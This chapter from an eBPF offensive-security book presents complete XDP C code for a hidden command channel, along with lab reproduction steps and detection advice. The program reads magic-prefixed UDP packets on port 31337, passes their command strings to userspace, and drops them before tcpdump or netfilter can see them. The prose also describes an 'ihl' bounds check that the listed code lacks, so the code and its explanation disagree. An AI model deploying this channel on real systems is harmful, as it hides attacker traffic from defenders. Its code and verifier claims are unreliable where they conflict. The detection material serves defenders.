---
layout: book
title: "Chapter 5b: The Ghost NIC"
date: 2025-02-04
---

# Chapter 5b: The Ghost NIC

> **See also**: [Blog post]({{ site.baseurl }}/the-ghost-nic.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05b-ghost-nic) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: `ch05b-ghost-nic` has been proved on Ubuntu 6.17.0 aarch64 (Lima VM, kernel 6.17.0-29-generic). No code changes were required.

XDP runs before the packet reaches the IP stack, and that's the whole primitive. An XDP program on a netdev sees every ingress frame ahead of netfilter, ahead of raw sockets, ahead of `tcpdump`'s AF_PACKET tap — and it can return `XDP_DROP` to make the frame disappear for everyone above it.

My first attempt used `cls_bpf` on ingress tc, and on the same interface AF_PACKET still saw the frames: tc ingress runs after the `ptype_all` walk in `__netif_receive_skb_core`, which is exactly where `tcpdump`'s tap sits. Moving to XDP, the frames stopped showing up in tcpdump. This isn't bypassing a security control — it's XDP behaving the way the architecture documents. The security consequence just falls out of where XDP sits in the stack.

## Mechanism

The program filters on IP, then UDP, then port, then a magic prefix — four nested bounds checks the verifier insists on before it lets you touch any packet field. Drop any one of them and the load fails at the matching dereference. Here's the whole thing:

```c
SEC("xdp")
int xdp_ghost(struct xdp_md *ctx) {
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) return XDP_PASS;
    if (eth->h_proto != bpf_htons(ETH_P_IP)) return XDP_PASS;

    struct iphdr *iph = (void *)(eth + 1);
    if ((void *)(iph + 1) > data_end) return XDP_PASS;
    if (iph->protocol != IPPROTO_UDP) return XDP_PASS;

    struct udphdr *udp = (void *)iph + (iph->ihl * 4);
    if ((void *)(udp + 1) > data_end) return XDP_PASS;
    if (udp->dest != bpf_htons(31337)) return XDP_PASS;

    char *payload = (void *)(udp + 1);
    if (payload + 5 > (char *)data_end) return XDP_PASS;
    if (__builtin_memcmp(payload, "GHOST", 5) != 0) return XDP_PASS;

    char cmd[48] = {};
    long copy_len = (char *)data_end - (payload + 5);
    if (copy_len > 47) copy_len = 47;
    bpf_probe_read_kernel(cmd, copy_len, payload + 5);

    struct evt e = { .src_ip = iph->saddr, .sport = udp->source };
    __builtin_memcpy(e.cmd, cmd, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);

    return XDP_DROP;
}
```

Those bounds checks aren't stylistic; they're the proof the verifier demands before it lets the program read packet memory. The `iph->ihl * 4` term is the one that trips people up: the verifier has to know the resulting pointer stays within `[data, data_end]` before it allows `(void *)iph + ihl` arithmetic, and the explicit `ihl < sizeof(*ip)` check (minimum 20) is what gives it the lower bound. Leave it out and you get `math between pkt pointer and register with unbounded min value is not allowed`.

Matching packets are copied into the ringbuf for the userspace loader to read, then dropped. Everything else passes through. `bpf_xdp_adjust_head` and `bpf_redirect_map` are available for the cross-namespace variant (see [chapter 15]({{ site.baseurl }}/book/act-3/chapter-15-netns-vlan-ghost.html)).

## Hook point

- `SEC("xdp")` attached to a veth (drv-mode, fallback to skb-mode).

The loader tries `XDP_FLAGS_DRV_MODE` first and falls back to `XDP_FLAGS_SKB_MODE`. On veth between kernel 4.19 and 5.2, native XDP on veth without the peer also attached would silently allow frames through; `XDP_DROP` returned but the frame continued. That bug was fixed in 5.2. The trigger script forces skb-mode with `-S` to stay deterministic across kernels.

Both modes are upstream of AF_PACKET. Both produce `XDP_DROP` semantics that defeat tcpdump. The difference is performance (native avoids sk_buff allocation), not the invisibility property. The loader attaches via `bpf_xdp_attach(ifindex, prog_fd, flags, NULL)`, visible in `bpftool net show` and `ip link show <if>` with `xdp prog_id`.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch05b-ghost-nic
make
sudo bash trigger.sh
# BEFORE: tcpdump on veth_host captures both magic UDP packets
# AFTER: tcpdump captures 0; ringbuf shows 2 DROPPED events with cmd strings
# expect: === GHOST_COVERT_CHANNEL_PROVEN dropped=2 tcpdump=0 ===
```

The trigger creates its own veth pair and network namespace. `veth_g0` lives in the host namespace with XDP attached; `veth_g1` lives in `ghost_ns`. Packets sent from inside `ghost_ns` to `10.66.66.1:31337` with the `GHOST` prefix are intercepted on the host side before any host-side observer sees them.

## Detection

- `bpftool net show` lists every netdev with an XDP program attached.
- `ip link show <if>` shows the `xdp prog_id` field (`xdpgeneric` for skb-mode, `xdp` for drv-mode).
- `bpftool prog show id <id> --pretty` gives the BTF and loader identity.
- Netdev counter anomaly: `ip -s link show <if>` shows `dropped` incrementing without corresponding IP/UDP errors. An XDP-dropped packet leaves no other trace in the protocol stack.
- An unexpected XDP attachment on a veth is the strongest signal; containers don't usually need XDP on their own interfaces unless running Cilium or similar. On a host without a CNI that uses XDP, any `bpftool net show` output with `xdp:` lines is anomalous.

## Scope

This is a Class IV primitive from chapter 20. The architectural point is simple: XDP isn't below netfilter by accident, it's below netfilter on purpose, so that high-performance packet processing can happen before the normal network stack runs. The same property that makes XDP good for DDoS mitigation and load balancing is what makes it useful here.

The interface's `rx_dropped` counter does tick up, so a defender who baselines drop counters catches this even without looking at XDP directly. More broadly, anyone relying on `tcpdump`, nftables, or raw sockets for host-level network visibility has to add a second source: an XDP program inventory, a `CAP_BPF` audit, and off-host network telemetry. At the XDP layer, the local observation tools just aren't in the path.

---

**Related material**

- Blog post: [The Ghost NIC]({{ site.baseurl }}/the-ghost-nic.html)
- POC source: [dBPF-pocs/pocs/ch05b-ghost-nic/](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05b-ghost-nic)
- Harness entry: search for `Poc("ch05b", ...)` in `dBPF-pocs/harness/proof.py`
